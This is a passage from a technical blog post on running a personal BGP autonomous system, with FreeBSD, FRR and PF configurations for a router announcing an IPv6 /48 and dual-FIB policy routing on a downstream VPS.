<li><strong>An IPv6 prefix</strong> - the address space you’ll announce. I received&nbsp;2a06:9801:1c::/48.</li>
</ol>
<p>As an individual, you don’t need to become a <span>RIPE</span> member (which involves fees and bureaucracy). Instead, you work with a <strong>sponsoring <span>LIR</span></strong> - an existing <span>RIPE</span> member who sponsors your resource registration. Several LIRs cater to hobbyists and small operators. The process typically&nbsp;involves:</p>
<ul>
<li>Filling out a request form with your intended use&nbsp;case</li>
<li>Creating the appropriate <span>RIPE</span> database objects (aut-num, inet6num,&nbsp;route6)</li>
<li>Setting up <span>RPKI</span> ROAs (Route Origin Authorizations) to cryptographically bind your prefix to your <span>AS</span></li>
</ul>
<p>Once the paperwork is done, you need upstream connectivity - someone willing to carry your <span>BGP</span> sessions and announce your routes to the rest of the&nbsp;internet.</p>
<h2>Architecture&nbsp;Overview</h2>
<p>The setup involves two tiers: a <span>BGP</span> router that peers with upstream providers, and downstream servers that receive tunneled subnets from the router’s&nbsp;/48.</p>
<div><pre><span></span><code>                    ┌──────────────────────────────┐
                    │     Default-Free Zone         │
                    └──────┬──────────────┬─────────┘
                           │              │
                    AS34927 (iFog)   AS209735 (Lagrange)
                           │              │
                      GRE tunnel     Direct peering
                           │              │
                    ┌──────┴──────────────┴─────────┐
                    │    router01 (BGP Router)       │
                    │     FreeBSD + FRR              │
                    │     AS201379                   │
                    │     2a06:9801:1c::/48          │
                    └──────┬──────────────┬─────────┘
                           │              │
                      GIF tunnel     GIF tunnel
                      (proto 41)     (proto 41)
                           │              │
                    ┌──────┴───┐   ┌──────┴──────────┐
                    │  vps01   │   │  dcgw01          │
                    │  VPS     │   │  DC OPNsense     │
                    │  :1000:: │   │  :2000::/62      │
                    │  /64     │   │                   │
                    └──────────┘   └──────────────────┘
</code></pre></div>

<p>The <span>BGP</span> router&nbsp;(<code>router01</code>) announces 2a06:9801:1c::/48 to two upstream providers and maintains a blackhole route for the aggregate. Individual /64s (and a /62 for my Colocation datacenter) are tunneled to downstream servers via <span>GIF</span> tunnels (IPv6-in-IPv4 encapsulation). Each server receives real, globally routable addresses from my prefix while keeping its existing provider-assigned IPv6 fully&nbsp;operational.</p>
<h2>The <span>BGP</span>&nbsp;Router</h2>
<p>The router runs on a FreeBSD <span>VM</span> at a colocation facility with direct connectivity to two upstream networks. Let’s walk through each&nbsp;layer.</p>
<h3>Network&nbsp;Configuration</h3>
<p>The&nbsp;router’s <code>/etc/rc.conf</code> sets up the physical interface, tunnel interfaces, and static&nbsp;routes:</p>
<div><pre><span></span><code><span>hostname</span><span>=</span><span>"router01"</span>

<span># Security</span>
<span>kern_securelevel_enable</span><span>=</span><span>"YES"</span>
<span>kern_securelevel</span><span>=</span><span>"2"</span>

<span># Physical interface</span>
<span>ifconfig_vtnet0</span><span>=</span><span>"inet 198.51.100.10/24 -rxcsum -txcsum -rxcsum6 -txcsum6 -lro -tso"</span>
<span>ifconfig_vtnet0_ipv6</span><span>=</span><span>"inet6 2001:db8:100::96/64"</span>

<span>defaultrouter</span><span>=</span><span>"198.51.100.1"</span>
<span>ipv6_defaultrouter</span><span>=</span><span>"2001:db8:100::1"</span>

<span># Loopback alias for originated prefix</span>
<span>ifconfig_lo0_alias0</span><span>=</span><span>"inet6 2a06:9801:1c::1 prefixlen 64"</span>

<span># Tunnel interfaces</span>
<span>cloned_interfaces</span><span>=</span><span>"gif0 gif1 gre0"</span>
<span>kld_list</span><span>=</span><span>"if_gif if_gre"</span>

<span># GRE Tunnel to transit provider (iFog)</span>
<span>ifconfig_gre0</span><span>=</span><span>"tunnel 198.51.100.10 198.51.100.44"</span>
<span>ifconfig_gre0_ipv6</span><span>=</span><span>"inet6 2001:db8:300::2 2001:db8:300::1 prefixlen 128"</span>
<span>ifconfig_gre0_descr</span><span>=</span><span>"Transit-iFog"</span>

<span># GIF Tunnel to VPS (vps01)</span>
<span>ifconfig_gif0</span><span>=</span><span>"tunnel 198.51.100.10 203.0.113.10"</span>
<span>ifconfig_gif0_ipv6</span><span>=</span><span>"inet6 2a06:9801:1c:ffff::1 2a06:9801:1c:ffff::2 prefixlen 128"</span>
<span>ifconfig_gif0_descr</span><span>=</span><span>"Tunnel-to-VPS"</span>
<span>ipv6_route_cloud</span><span>=</span><span>"2a06:9801:1c:1000::/64 2a06:9801:1c:ffff::2"</span>

<span># GIF Tunnel to datacenter firewall (dcgw01)</span>
<span>ifconfig_gif1</span><span>=</span><span>"tunnel 198.51.100.10 192.0.2.50"</span>
<span>ifconfig_gif1_ipv6</span><span>=</span><span>"inet6 2a06:9801:1c:ffff::3 2a06:9801:1c:ffff::4 prefixlen 128"</span>
<span>ifconfig_gif1_descr</span><span>=</span><span>"Tunnel-to-Datacenter"</span>
<span>ipv6_route_dc</span><span>=</span><span>"2a06:9801:1c:2000::/62 2a06:9801:1c:ffff::4"</span>

<span># Blackhole route for the aggregate + downstream routes</span>
<span>ipv6_static_routes</span><span>=</span><span>"myblock cloud dc"</span>
<span>ipv6_route_myblock</span><span>=</span><span>"2a06:9801:1c::/48 -reject"</span>
<span>ipv6_gateway_enable</span><span>=</span><span>"YES"</span>

<span># Services</span>
<span>pf_enable</span><span>=</span><span>"YES"</span>
<span>pflog_enable</span><span>=</span><span>"YES"</span>
<span>frr_enable</span><span>=</span><span>"YES"</span>
<span>zfs_enable</span><span>=</span><span>"YES"</span>
<span>sshd_enable</span><span>=</span><span>"YES"</span>
</code></pre></div>

<p>A few things worth&nbsp;explaining:</p>
<ul>
<li><strong>The blackhole route</strong>&nbsp;(<code>-reject</code> for the /48) is essential. Without it, traffic for unassigned subnets within your prefix would follow the default route back to the upstream, creating a routing loop. The blackhole ensures unrouted traffic is dropped&nbsp;locally.</li>
<li><strong>Point-to-point tunnel addresses</strong> use /128 prefixes on&nbsp;the <code>2a06:9801:1c:ffff::/64</code> link subnet. Each tunnel gets a pair of addresses from this&nbsp;range.</li>
<li><strong>Downstream routes</strong> point specific subnets at the far end of each tunnel. The /64 for the <span>VPS</span> and /62 for the datacenter are routed to their respective tunnel&nbsp;endpoints.</li>
<li><strong><span>GRE</span> vs <span>GIF</span></strong>: The iFog peering uses <span>GRE</span> because that’s what the provider requires. The downstream tunnels use <span>GIF</span> (protocol 41, IPv6-in-IPv4) which is simpler and has less&nbsp;overhead.</li>
</ul>
<h3><span>FRR</span>&nbsp;Configuration</h3>
<p><span>FRR</span> (Free Range Routing) handles the <span>BGP</span> sessions. The configuration lives&nbsp;at <code>/usr/local/etc/frr/frr.conf</code>:</p>
<div><pre><span></span><code>frr version 10.5.1
frr defaults traditional
hostname router01
log syslog informational
service integrated-vtysh-config
!
ipv6 prefix-list PL-MY-NET seq 5 permit 2a06:9801:1c::/48
!
ipv6 prefix-list PL-BOGONS seq 5 deny ::/0 le 7
ipv6 prefix-list PL-BOGONS seq 10 deny ::/8
ipv6 prefix-list PL-BOGONS seq 15 deny 100::/8
ipv6 prefix-list PL-BOGONS seq 20 deny 200::/7
ipv6 prefix-list PL-BOGONS seq 25 deny 400::/6
ipv6 prefix-list PL-BOGONS seq 30 deny 800::/5
ipv6 prefix-list PL-BOGONS seq 35 deny 1000::/4
ipv6 prefix-list PL-BOGONS seq 40 deny 4000::/3
ipv6 prefix-list PL-BOGONS seq 45 deny 6000::/3
ipv6 prefix-list PL-BOGONS seq 50 deny 8000::/3
ipv6 prefix-list PL-BOGONS seq 55 deny a000::/3
ipv6 prefix-list PL-BOGONS seq 60 deny c000::/3
ipv6 prefix-list PL-BOGONS seq 65 deny e000::/4
ipv6 prefix-list PL-BOGONS seq 70 deny f000::/5
ipv6 prefix-list PL-BOGONS seq 75 deny f800::/6
ipv6 prefix-list PL-BOGONS seq 80 deny fc00::/7
ipv6 prefix-list PL-BOGONS seq 85 deny fe80::/10
ipv6 prefix-list PL-BOGONS seq 90 deny fec0::/10
ipv6 prefix-list PL-BOGONS seq 95 deny ff00::/8
ipv6 prefix-list PL-BOGONS seq 100 deny 2a06:9801:1c::/48
ipv6 prefix-list PL-BOGONS seq 105 deny ::/0 ge 49
ipv6 prefix-list PL-BOGONS seq 110 permit ::/0 le 48
!
route-map RM-IFOG-OUT permit 10
 match ipv6 address prefix-list PL-MY-NET
 set community 34927:9501 34927:9301 additive
exit
!
route-map RM-LAGRANGE-OUT permit 10
 match ipv6 address prefix-list PL-MY-NET
 set as-path prepend 201379 201379
exit
!
route-map RM-IFOG-IN permit 10
 match ipv6 address prefix-list PL-BOGONS
exit
!
route-map RM-LAGRANGE-IN permit 10
 match ipv6 address prefix-list PL-BOGONS
exit
!
ipv6 route 2a06:9801:1c::/48 blackhole
!
router bgp 201379
 bgp router-id 198.51.100.10
 no bgp default ipv4-unicast
 neighbor 2001:db8:300::1 remote-as 34927
 neighbor 2001:db8:300::1 description Upstream-iFog
 neighbor 2001:db8:300::1 ttl-security hops 1
 neighbor 2001:db8:300::1 update-source gre0
 neighbor 2001:db8:100::ff remote-as 209735
 neighbor 2001:db8:100::ff description Upstream-Lagrange
 neighbor 2001:db8:100::ff ttl-security hops 1
 neighbor 2001:db8:100::ff update-source 2001:db8:100::96
 !
 address-family ipv6 unicast
  network 2a06:9801:1c::/48
  neighbor 2001:db8:300::1 activate
  neighbor 2001:db8:300::1 soft-reconfiguration inbound
  neighbor 2001:db8:300::1 maximum-prefix 250000 90 restart 30
  neighbor 2001:db8:300::1 route-map RM-IFOG-IN in
  neighbor 2001:db8:300::1 route-map RM-IFOG-OUT out
  neighbor 2001:db8:100::ff activate
  neighbor 2001:db8:100::ff soft-reconfiguration inbound
  neighbor 2001:db8:100::ff maximum-prefix 250000 90 restart 30
  neighbor 2001:db8:100::ff route-map RM-LAGRANGE-IN in
  neighbor 2001:db8:100::ff route-map RM-LAGRANGE-OUT out
 exit-address-family
exit
</code></pre></div>

<p>There’s a lot happening here. Let me break down the key design&nbsp;decisions.</p>
<h4>Prefix&nbsp;Lists</h4>
<p>Two prefix lists control what gets sent and&nbsp;received:</p>
<ul>
<li><strong><span>PL</span>-<span>MY</span>-<span>NET</span></strong>: Matches only our /48. Used in outbound route-maps to ensure we only ever announce our own&nbsp;prefix.</li>
<li><strong><span>PL</span>-<span>BOGONS</span></strong>: A comprehensive bogon filter for inbound routes. This rejects non-routable address space (link-local, <span>ULA</span>, multicast, documentation ranges), our own prefix (to prevent loops), and anything more specific than a /48 or less specific than a /8. The&nbsp;final <code>permit ::/0 le 48</code> at the end accepts everything that survived the deny&nbsp;rules.</li>
</ul>
<p>The bogon filter deserves emphasis. Accepting bad routes from peers can cause anything from black-holed traffic to becoming an unwitting participant in route hijacks. Filter aggressively on&nbsp;inbound.</p>
<h4>Route&nbsp;Maps</h4>
<p>Each peer gets its own pair of inbound/outbound route&nbsp;maps:</p>
<ul>
<li><strong>Outbound to iFog</strong>&nbsp;(<code>RM-IFOG-OUT</code>): Announces our /48 with <span>BGP</span>&nbsp;communities <code>34927:9501</code> and <code>34927:9301</code>. These are iFog-specific communities that control route propagation - in this case, requesting announcement to specific peering&nbsp;partners.</li>
<li><strong>Outbound to Lagrange</strong>&nbsp;(<code>RM-LAGRANGE-OUT</code>): Announces our /48 with <span>AS</span>-path prepending (adds our <span>ASN</span> twice). This makes the Lagrange path appear longer to the rest of the internet, steering inbound traffic to prefer the iFog path. Useful for traffic engineering when one upstream has better&nbsp;connectivity.</li>
<li><strong>Inbound from both</strong>: Apply the bogon filter to reject garbage&nbsp;routes.</li>
</ul>
<h4><span>BGP</span> Session&nbsp;Details</h4>
<ul>
<li><strong><code>no bgp default ipv4-unicast</code></strong>: We’re IPv6-only. Don’t activate IPv4 address family by&nbsp;default.</li>
<li><strong><code>ttl-security hops 1</code></strong>: <span>GTSM</span> (Generalized <span>TTL</span> Security Mechanism) - reject <span>BGP</span> packets with <span>TTL</span> less than 254. This prevents remote attacks on the <span>BGP</span> session since only directly connected peers can send packets with <span>TTL</span>&nbsp;255.</li>
<li><strong><code>soft-reconfiguration inbound</code></strong>: Store received routes before applying filters. This lets you change inbound policy without resetting the <span>BGP</span>&nbsp;session.</li>
<li><strong><code>maximum-prefix 250000 90 restart 30</code></strong>: Safety valve. If a peer sends more than 250,000 prefixes (or 90% of that as a warning), tear down the session and retry after 30 minutes. Protects against route leaks from&nbsp;upstream.</li>
</ul>
<h3>Firewall on the&nbsp;Router</h3>
<p>The <span>BGP</span> router’s <span>PF</span> configuration protects the control plane while allowing data plane&nbsp;forwarding:</p>
<div><pre><span></span><code><span># --- Macros ---</span>
<span>ext_if</span><span> </span><span>=</span><span> </span><span>"vtnet0"</span>
<span>dc_tun</span><span> </span><span>=</span><span> </span><span>"gif1"</span>
<span>vps_tun</span><span> </span><span>=</span><span> </span><span>"gif0"</span>

<span>trusted_ipv4</span><span> </span><span>=</span><span> </span><span>"{ 198.51.100.100, 198.51.100.101 }"</span>
<span>trusted_ipv6</span><span> </span><span>=</span><span> </span><span>"{ 2001:db8:ffff:1::/64, 2001:db8:ffff:2::/64 }"</span>

<span>bgp_peers_v4</span><span> </span><span>=</span><span> </span><span>"{ 198.51.100.20 }"</span>
<span>bgp_peers_v6</span><span> </span><span>=</span><span> </span><span>"{ 2001:db8:100::ff }"</span>
<span>ifog_gre_endpoint</span><span> </span><span>=</span><span> </span><span>"198.51.100.44"</span>
<span>ifog_bgp_peer</span><span>     </span><span>=</span><span> </span><span>"2001:db8:300::1"</span>

<span>my_network_v6</span><span> </span><span>=</span><span> </span><span>"2a06:9801:1c::/48"</span>
<span>vps_v4</span><span> </span><span>=</span><span> </span><span>"203.0.113.10"</span>

<span># --- Tables ---</span>
<span>table</span><span> </span><span>&lt;</span><span>bruteforce</span><span>&gt;</span><span> </span><span>persist</span>
<span>table</span><span> </span><span>&lt;</span><span>trusted_v4</span><span>&gt;</span><span> </span><span>const</span><span> </span><span>{</span><span> </span><span>$</span><span>trusted_ipv4</span><span> </span><span>}</span>
<span>table</span><span> </span><span>&lt;</span><span>trusted_v6</span><span>&gt;</span><span> </span><span>const</span><span> </span><span>{</span><span> </span><span>$</span><span>trusted_ipv6</span><span> </span><span>}</span>
<span>table</span><span> </span><span>&lt;</span><span>bgp_peers_v4</span><span>&gt;</span><span> </span><span>const</span><span> </span><span>{</span><span> </span><span>$</span><span>bgp_peers_v4</span><span> </span><span>}</span>
<span>table</span><span> </span><span>&lt;</span><span>bgp_peers_v6</span><span>&gt;</span><span> </span><span>const</span><span> </span><span>{</span><span> </span><span>$</span><span>bgp_peers_v6</span><span> </span><span>}</span>
<span>table</span><span> </span><span>&lt;</span><span>bogons</span><span>&gt;</span><span> </span><span>const</span><span> </span><span>{</span><span> </span><span>0.0</span><span>.</span><span>0.0</span><span>/</span><span>8</span><span>,</span><span> </span><span>10.0</span><span>.</span><span>0.0</span><span>/</span><span>8</span><span>,</span><span> </span><span>172.16</span><span>.</span><span>0.0</span><span>/</span><span>12</span><span>,</span><span> </span>\
<span>    </span><span>192.168</span><span>.</span><span>0.0</span><span>/</span><span>16</span><span>,</span><span> </span><span>169.254</span><span>.</span><span>0.0</span><span>/</span><span>16</span><span>,</span><span> </span><span>::</span><span>/</span><span>96</span><span>,</span><span> </span><span>fc00</span><span>::</span><span>/</span><span>7</span><span>,</span><span> </span>\
<span>    </span><span>fec0</span><span>::</span><span>/</span><span>10</span><span>,</span><span> </span><span>ff00</span><span>::</span><span>/</span><span>8</span><span> </span><span>}</span>

<span># --- Options ---</span>
<span>set</span><span> </span><span>skip</span><span> </span><span>on</span><span> </span><span>lo0</span>
<span>set</span><span> </span><span>block</span><span>-</span><span>policy</span><span> </span><span>drop</span>
<span>set</span><span> </span><span>loginterface</span><span> </span><span>$</span><span>ext_if</span>

<span># --- Scrub ---</span>
<span>scrub</span><span> </span><span>in</span><span> </span><span>all</span><span> </span><span>fragment</span><span> </span><span>reassemble</span>
<span>scrub</span><span> </span><span>on</span><span> </span><span>$</span><span>vps_tun</span><span> </span><span>max</span><span>-</span><span>mss</span><span> </span><span>1440</span>
<span>scrub</span><span> </span><span>on</span><span> </span><span>$</span><span>dc_tun</span><span> </span><span>max</span><span>-</span><span>mss</span><span> </span><span>1140</span>
<span>scrub</span><span> </span><span>on</span><span> </span><span>gre0</span><span> </span><span>max</span><span>-</span><span>mss</span><span> </span><span>1400</span>

<span># --- Filtering ---</span>
<span>block</span><span> </span><span>log</span><span> </span><span>all</span>
<span>block</span><span> </span><span>in</span><span> </span><span>quick</span><span> </span><span>on</span><span> </span><span>$</span><span>ext_if</span><span> </span><span>from</span><span> </span><span>{</span><span> </span><span>&lt;</span><span>bogons</span><span>&gt;</span><span>,</span><span> </span><span>$</span><span>my_network_v6</span><span> </span><span>}</span><span> </span><span>to</span><span> </span><span>any</span>
<span>antispoof</span><span> </span><span>quick</span><span> </span><span>for</span><span> </span><span>{</span><span> </span><span>$</span><span>ext_if</span><span> </span><span>}</span>

<span># --- Control Plane ---</span>

<span># SSH from trusted sources only</span>
<span>pass</span><span> </span><span>in</span><span> </span><span>quick</span><span> </span><span>on</span><span> </span><span>$</span><span>ext_if</span><span> </span><span>proto</span><span> </span><span>tcp</span><span> </span><span>from</span><span> </span><span>&lt;</span><span>trusted_v4</span><span>&gt;</span><span> </span><span>to</span><span> </span><span>(</span><span>$</span><span>ext_if</span><span>)</span><span> </span><span>port</span><span> </span><span>22</span><span> </span>\
<span>    </span><span>flags</span><span> </span><span>S</span><span>/</span><span>SA</span><span> </span><span>keep</span><span> </span><span>state</span><span> </span>\
<span>    </span><span>(</span><span>max</span><span>-</span><span>src</span><span>-</span><span>conn</span><span> </span><span>5</span><span>,</span><span> </span><span>max</span><span>-</span><span>src</span><span>-</span><span>conn</span><span>-</span><span>rate</span><span> </span><span>3</span><span>/</span><span>30</span><span>,</span><span> </span>\
<span>     </span><span>overload</span><span> </span><span>&lt;</span><span>bruteforce</span><span>&gt;</span><span> </span><span>flush</span><span> </span><span>global</span><span>)</span>
<span>pass</span><span> </span><span>in</span><span> </span><span>quick</span><span> </span><span>on</span><span> </span><span>$</span><span>ext_if</span><span> </span><span>proto</span><span> </span><span>tcp</span><span> </span><span>from</span><span> </span><span>&lt;</span><span>trusted_v6</span><span>&gt;</span><span> </span><span>to</span><span> </span><span>(</span><span>$</span><span>ext_if</span><span>)</span><span> </span><span>port</span><span> </span><span>22</span><span> </span>\
<span>    </span><span>flags</span><span> </span><span>S</span><span>/</span><span>SA</span><span> </span><span>keep</span><span> </span><span>state</span><span> </span>\
<span>    </span><span>(</span><span>max</span><span>-</span><span>src</span><span>-</span><span>conn</span><span> </span><span>5</span><span>,</span><span> </span><span>max</span><span>-</span><span>src</span><span>-</span><span>conn</span><span>-</span><span>rate</span><span> </span><span>3</span><span>/</span><span>30</span><span>,</span><span> </span>\
<span>     </span><span>overload</span><span> </span><span>&lt;</span><span>bruteforce</span><span>&gt;</span><span> </span><span>flush</span><span> </span><span>global</span><span>)</span>

<span># BGP (TCP 179) - strictly limited to known peers</span>
<span>pass</span><span> </span><span>in</span><span> </span><span>quick</span><span> </span><span>on</span><span> </span><span>$</span><span>ext_if</span><span> </span><span>proto</span><span> </span><span>tcp</span><span> </span><span>from</span><span> </span><span>&lt;</span><span>bgp_peers_v4</span><span>&gt;</span><span> </span><span>to</span><span> </span><span>(</span><span>$</span><span>ext_if</span><span>)</span><span> </span><span>port</span><span> </span><span>179</span><span> </span>\
<span>    </span><span>flags</span><span> </span><span>S</span><span>/</span><span>SA</span><span> </span><span>keep</span><span> </span><span>state</span>
<span>pass</span><span> </span><span>in</span><span> </span><span>quick</span><span> </span><span>on</span><span> </span><span>$</span><span>ext_if</span><span> </span><span>proto</span><span> </span><span>tcp</span><span> </span><span>from</span><span> </span><span>&lt;</span><span>bgp_peers_v6</span><span>&gt;</span><span> </span><span>to</span><span> </span><span>(</span><span>$</span><span>ext_if</span><span>)</span><span> </span><span>port</span><span> </span><span>179</span><span> </span>\
<span>    </span><span>flags</span><span> </span><span>S</span><span>/</span><span>SA</span><span> </span><span>keep</span><span> </span><span>state</span>

<span># GRE tunnel from iFog</span>
<span>pass</span><span> </span><span>in</span><span> </span><span>quick</span><span> </span><span>on</span><span> </span><span>$</span><span>ext_if</span><span> </span><span>proto</span><span> </span><span>gre</span><span> </span><span>from</span><span> </span><span>$</span><span>ifog_gre_endpoint</span><span> </span><span>to</span><span> </span><span>(</span><span>$</span><span>ext_if</span><span>)</span>
<span>pass</span><span> </span><span>in</span><span> </span><span>quick</span><span> </span><span>on</span><span> </span><span>gre0</span><span> </span><span>proto</span><span> </span><span>tcp</span><span> </span><span>from</span><span> </span><span>$</span><span>ifog_bgp_peer</span><span> </span><span>to</span><span> </span><span>any</span><span> </span><span>port</span><span> </span><span>179</span>

<span># ICMPv6: essential for NDP, PMTUD, and diagnostics</span>
<span>pass</span><span> </span><span>in</span><span> </span><span>quick</span><span> </span><span>inet6</span><span> </span><span>proto</span><span> </span><span>ipv6</span><span>-</span><span>icmp</span><span> </span><span>icmp6</span><span>-</span><span>type</span><span> </span><span>{</span><span> </span>\
<span>    </span><span>echoreq</span><span>,</span><span> </span><span>echorep</span><span>,</span><span> </span><span>neighbrsol</span><span>,</span><span> </span><span>neighbradv</span><span>,</span><span> </span>\
<span>    </span><span>toobig</span><span>,</span><span> </span><span>timex</span><span>,</span><span> </span><span>paramprob</span><span>,</span><span> </span><span>routersol</span><span> </span><span>}</span>
<span>pass</span><span> </span><span>in</span><span> </span><span>quick</span><span> </span><span>inet</span><span> </span><span>proto</span><span> </span><span>icmp</span><span> </span><span>icmp</span><span>-</span><span>type</span><span> </span><span>{</span><span> </span><span>echoreq</span><span>,</span><span> </span><span>unreach</span><span>,</span><span> </span><span>timex</span><span> </span><span>}</span>

<span># --- Data Plane ---</span>

<span># Inbound traffic destined for our prefix</span>
<span>pass</span><span> </span><span>in</span><span> </span><span>quick</span><span> </span><span>on</span><span> </span><span>$</span><span>ext_if</span><span> </span><span>inet6</span><span> </span><span>from</span><span> </span><span>any</span><span> </span><span>to</span><span> </span><span>$</span><span>my_network_v6</span><span> </span><span>keep</span><span> </span><span>state</span>
<span>pass</span><span> </span><span>in</span><span> </span><span>quick</span><span> </span><span>on</span><span> </span><span>gre0</span><span> </span><span>inet6</span><span> </span><span>from</span><span> </span><span>any</span><span> </span><span>to</span><span> </span><span>$</span><span>my_network_v6</span><span> </span><span>keep</span><span> </span><span>state</span>

<span># Return traffic from downstream tunnels</span>
<span>pass</span><span> </span><span>in</span><span> </span><span>quick</span><span> </span><span>on</span><span> </span><span>$</span><span>vps_tun</span><span> </span><span>inet6</span><span> </span><span>from</span><span> </span><span>$</span><span>my_network_v6</span><span> </span><span>to</span><span> </span><span>any</span><span> </span><span>keep</span><span> </span><span>state</span>
<span>pass</span><span> </span><span>in</span><span> </span><span>quick</span><span> </span><span>on</span><span> </span><span>$</span><span>dc_tun</span><span> </span><span>inet6</span><span> </span><span>from</span><span> </span><span>$</span><span>my_network_v6</span><span> </span><span>to</span><span> </span><span>any</span><span> </span><span>keep</span><span> </span><span>state</span>

<span># GIF tunnel encapsulation (proto 41) from downstream endpoints</span>
<span>pass</span><span> </span><span>in</span><span> </span><span>quick</span><span> </span><span>on</span><span> </span><span>$</span><span>ext_if</span><span> </span><span>proto</span><span> </span><span>41</span><span> </span><span>from</span><span> </span><span>$</span><span>vps_v4</span><span> </span><span>to</span><span> </span><span>(</span><span>$</span><span>ext_if</span><span>)</span>

<span># Outbound</span>
<span>pass</span><span> </span><span>out</span><span> </span><span>quick</span><span> </span><span>all</span><span> </span><span>keep</span><span> </span><span>state</span>
</code></pre></div>

<p>The firewall cleanly separates <strong>control plane</strong> (<span>SSH</span>, <span>BGP</span> sessions) from <strong>data plane</strong> (forwarded traffic). The control plane rules are strict: <span>BGP</span> is locked to known peer addresses, <span>SSH</span> to trusted management IPs. The data plane rules are simpler since the router just needs to forward packets between upstreams and downstream&nbsp;tunnels.</p>
<p>The <code>block in quick on $ext_if from { &lt;bogons&gt;, $my_network_v6 }</code> rule is important - it drops packets claiming to come from our own prefix arriving on the external interface. If someone on the internet spoofs a source address from our range, this catches it before it enters the forwarding&nbsp;path.</p>
<p>Note the per-tunnel <span>MSS</span> clamping in the scrub section. Each tunnel has different overhead (<span>GRE</span> adds more headers than <span>GIF</span>), so the <span>MSS</span> values differ. Getting this wrong causes mysterious connection stalls with large&nbsp;packets.</p>
<h2>The Downstream Server: Dual-Stack with Policy&nbsp;Routing</h2>
<p>This is where things get interesting. The <span>VPS</span>&nbsp;(<code>vps01</code>) already has provider-assigned IPv6 from its hoster. Jails on this server use addresses from both address&nbsp;spaces:</p>
<ul>
<li><strong>Provider IPv6</strong> (2001:db8:200:0:1000::/68) - the hoster’s addresses, NATed to the&nbsp;host</li>
<li><strong><span>BGP</span> IPv6</strong> (2a06:9801:1c:1000::/64) - our own prefix, routed natively via the <span>GIF</span>&nbsp;tunnel</li>
<li><strong>Private IPv4</strong> (10.254.254.0/24) - NATed to the host’s public&nbsp;IPv4</li>
</ul>
<p>The challenge: when a jail sends traffic from its <span>BGP</span> address (2a06:…), that traffic must exit through the <span>GIF</span> tunnel to the <span>BGP</span> router - not through the default route to the <span>VPS</span> provider, where it would be dropped as spoofed. But traffic from the provider address must continue using the normal default&nbsp;route.</p>
<p>The solution is <strong>dual-<span>FIB</span> policy routing</strong> - FreeBSD’s implementation of multiple routing&nbsp;tables.</p>
<h3>How Dual-<span>FIB</span>&nbsp;Works</h3>
<p>FreeBSD supports multiple routing tables called FIBs (Forwarding Information Bases). Each <span>FIB</span> is an independent routing table with its own default route and entries. Interfaces and <span>PF</span> rules can assign traffic to a specific <span>FIB</span>, and the kernel consults the appropriate table when&nbsp;forwarding.</p>
<div><pre><span></span><code>FIB 0 (default):
  default --&gt; vtnet0 --&gt; VPS provider upstream
  Used by: host traffic, provider-addressed jail traffic

FIB 1:
  default --&gt; gif0 --&gt; BGP router (router01)
  Used by: BGP-addressed jail traffic (2a06:9801:1c::/48)
</code></pre></div>

<h3>Network&nbsp;Configuration</h3>
<p>Here’s the relevant portion of the&nbsp;server’s <code>/etc/rc.conf</code>:</p>
<div><pre><span></span><code><span>hostname</span><span>=</span><span>"vps01.example.com"</span>

<span>kern_securelevel_enable</span><span>=</span><span>"YES"</span>
<span>kern_securelevel</span><span>=</span><span>"2"</span>

<span># Primary interface - provider IPv4 and IPv6</span>
<span>ifconfig_vtnet0</span><span>=</span><span>"inet 203.0.113.10 netmask 255.255.252.0 -lro -tso"</span>
<span>ifconfig_vtnet0_ipv6</span><span>=</span><span>"inet6 2001:db8:200::2 prefixlen 68"</span>
<span>defaultrouter</span><span>=</span><span>"203.0.113.1"</span>
<span>ipv6_defaultrouter</span><span>=</span><span>"fe80::1%vtnet0"</span>

<span># Jail bridge - three address spaces</span>
<span>cloned_interfaces</span><span>=</span><span>"bridge0 gif0"</span>
<span>ifconfig_bridge0_name</span><span>=</span><span>"bastille0"</span>
<span>ifconfig_bastille0</span><span>=</span><span>"inet 10.254.254.1/24"</span>
<span>ifconfig_bastille0_ipv6</span><span>=</span><span>"inet6 2001:db8:200:0:1000::1 prefixlen 68"</span>
<span>ifconfig_bastille0_alias0</span><span>=</span><span>"inet6 2a06:9801:1c:1000::1 prefixlen 64"</span>

<span># GIF tunnel to BGP router - assigned to FIB 1</span>
<span>ifconfig_gif0</span><span>=</span><span>"fib 1 tunnel 203.0.113.10 198.51.100.10 tunnelfib 0"</span>
<span>ifconfig_gif0_ipv6</span><span>=</span><span>"inet6 2a06:9801:1c:ffff::2 2a06:9801:1c:ffff::1 prefixlen 128"</span>

<span># Enable forwarding</span>
<span>gateway_enable</span><span>=</span><span>"YES"</span>
<span>ipv6_gateway_enable</span><span>=</span><span>"YES"</span>

<span># FIB 1 routing table entries</span>
<span>static_routes</span><span>=</span><span>"fib1default jailleak bgplink"</span>
<span>route_fib1default</span><span>=</span><span>"-6 default -interface gif0 -fib 1"</span>
<span>route_jailleak</span><span>=</span><span>"-6 2001:db8:200:0:1000::/68 -interface bastille0 -fib 1"</span>
<span>route_bgplink</span><span>=</span><span>"-6 2a06:9801:1c:1000::/64 -interface bastille0 -fib 1"</span>
</code></pre></div>

<p>The <span>GIF</span> tunnel configuration deserves a closer&nbsp;look:</p>
<div><pre><span></span><code><span>ifconfig_gif0</span><span>=</span><span>"fib 1 tunnel 203.0.113.10 198.51.100.10 tunnelfib 0"</span>
</code></pre></div>

<p>This single line contains two critical&nbsp;directives:</p>
<ul>
<li><strong><code>fib 1</code></strong>: The tunnel interface itself lives in <span>FIB</span> 1. Traffic arriving on gif0 and traffic routed out gif0 consults routing table&nbsp;1.</li>
<li><strong><code>tunnelfib 0</code></strong>: But the outer IPv4 encapsulation (the 203.0.113.10 —&gt; 198.51.100.10 wrapper) uses <span>FIB</span> 0. This is essential - the IPv4 path to the <span>BGP</span> router goes through the provider’s default route in <span>FIB</span> 0.&nbsp;Without <code>tunnelfib 0</code>, the encapsulated packets would try to use <span>FIB</span> 1’s default route (which points at gif0 itself), creating a recursive&nbsp;loop.</li>
</ul>
<p>The three static routes in <span>FIB</span> 1 complete the&nbsp;picture:</p>
<ul>
<li><strong><code>fib1default</code></strong>: Default route in <span>FIB</span> 1 exits through gif0 to the <span>BGP</span>&nbsp;router</li>
<li><strong><code>jailleak</code></strong>: Tells <span>FIB</span> 1 that the provider’s jail subnet is reachable via bastille0 (without this, return traffic in <span>FIB</span> 1 for jails’ provider addresses would try to exit through&nbsp;gif0)</li>
<li><strong><code>bgplink</code></strong>: Same for the <span>BGP</span> jail subnet - <span>FIB</span> 1 needs to know these addresses are local on&nbsp;bastille0</li>
</ul>
<h3><span>PF</span>: The Routing&nbsp;Glue</h3>
